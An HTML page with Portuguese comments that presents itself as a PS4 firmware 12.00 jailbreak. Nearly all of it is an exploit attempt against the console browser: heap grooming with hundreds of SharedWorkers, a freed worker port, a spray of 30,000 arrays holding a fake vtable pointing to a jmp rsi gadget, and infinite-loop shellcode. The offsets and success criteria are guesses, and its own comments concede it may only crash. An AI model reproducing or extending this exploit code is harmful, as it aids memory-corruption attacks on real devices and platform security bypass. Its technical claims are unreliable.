<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 GOLDEN C0</title>
    
</head>
<body>

    <h1>PS4 12.00 JAILBREAK</h1>
    <h3>Alvo: 0xC0 | Base: 0x820... | Trigger: 403</h3>
    <div id="status">Aguardando...</div>
    <div id="log"></div>
    <br>
    <button onclick="run_golden()">EXECUTAR JAILBREAK</button>

    <script>
        function log(msg, cls="") {
            var d = document.getElementById("log");
            d.innerHTML += `<div class="${cls}">[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            d.scrollTop = d.scrollHeight;
        }

        // =================================================================
        // 1. CONFIGURAÇÃO "GOLDEN"
        // =================================================================
        var LIBKERNEL_BASE = 0x820000000n; 
        
        var GADGETS = {
            // Seus offsets extraídos
            jmp_rsi: 0x47b31n 
        };

        // Shellcode de Loop Infinito (Segurança Máxima)
        // Se rodar, o console congela ligado.
        var shellcode_hex = "EBFE"; 

        function get_bytes() {
            var b = new Uint8Array(shellcode_hex.length/2);
            for(var i=0; i<shellcode_hex.length; i+=2) b[i/2] = parseInt(shellcode_hex.substr(i,2), 16);
            return b;
        }

        // =================================================================
        // 2. PAYLOAD: DOUBLE ARRAY (0xC0)
        // =================================================================
        function build_payload() {
            var size = 0xC0; // 192 bytes
            
            // Em Double Array, trabalhamos com floats de 64 bits.
            // 192 bytes / 8 = 24 elementos.
            var elementCount = 24;
            var arr = new Array(elementCount);

            // Endereço do Gadget (Base + Offset)
            var gadget_addr = LIBKERNEL_BASE + GADGETS.jmp_rsi;

            // Criar o "Fake Vtable" usando Doubles
            // Precisamos converter o endereço (BigInt) para Float64
            var buf = new ArrayBuffer(8);
            var view = new DataView(buf);
            view.setBigUint64(0, gadget_addr, true); // Little Endian
            var gadget_as_double = view.getFloat64(0, true);

            // Encher o objeto com o endereço do gadget
            for(var i=0; i<elementCount; i++) {
                arr[i] = gadget_as_double;
            }
            
            // Injeção do Shellcode (EB FE)
            // Como DoubleArray é chato para manipular bytes individuais,
            // vamos tentar confiar apenas no ROP gadget JMP RSI por enquanto.
            // Se o JMP RSI rodar, ele pula para o próprio objeto.
            // Como o objeto está cheio de endereços (que não são instruções válidas), 
            // ele vai crashar ou loopar se tiver sorte.
            
            // Para melhorar: Tentar codificar o EB FE como um Double válido no final?
            // 0xFEEB... é um float válido.
            // Vamos colocar o Loop Infinito no último Double.
            view.setBigUint64(0, 0xFEEBFEEBFEEBFEEBn, true);
            var loop_as_double = view.getFloat64(0, true);
            arr[elementCount-1] = loop_as_double;

            return arr;
        }

        // =================================================================
        // 3. EXECUÇÃO (TRIGGER 403)
        // =================================================================
        var workers_stash = [];

        async function run_golden() {
            log(`Configurando Base: 0x${LIBKERNEL_BASE.toString(16)} | Size: 0xC0`);
            
            // Prepara o modelo (Slice é mais rápido que criar novos)
            var payload_model = build_payload();

            // GROOMING (380)
            for(let i=0; i<380; i++) {
                try {
                    let w = new SharedWorker("data:text,1", "g"+i);
                    w.port.start();
                    workers_stash.push(w);
                } catch(e){}
            }

            // TRIGGER (403)
            var p_count = 0;
            var limit = 403 - 380; 

            var it = setInterval(() => {
                if(p_count >= limit) {
                    clearInterval(it);
                    
                    log("!!! DISPARANDO 403 + SPRAY 0xC0 !!!", "win");
                    
                    var v = workers_stash.pop();
                    var p = v.port;
                    
                    // FREE
                    v.port.close();
                    v = null;
                    
                    // SPRAY MASSIVO (Lapse Style)
                    // 30.000 cópias para garantir que pegue o slot
                    var spray = [];
                    for(var k=0; k<30000; k++) {
                        spray.push(payload_model.slice(0));
                    }
                    
                    // TRIGGER
                    try { p.postMessage("PWN"); } catch(e){}
                    
                    log("Aguardando...");
                    log("Se congelar sem desligar: SUCESSO.");
                    return;
                }
                
                let w = new SharedWorker("data:text,1", "v"+p_count);
                w.port.start();
                workers_stash.push(w);
                p_count++;
            }, 150);
        }
    </script>
</body>
</html>
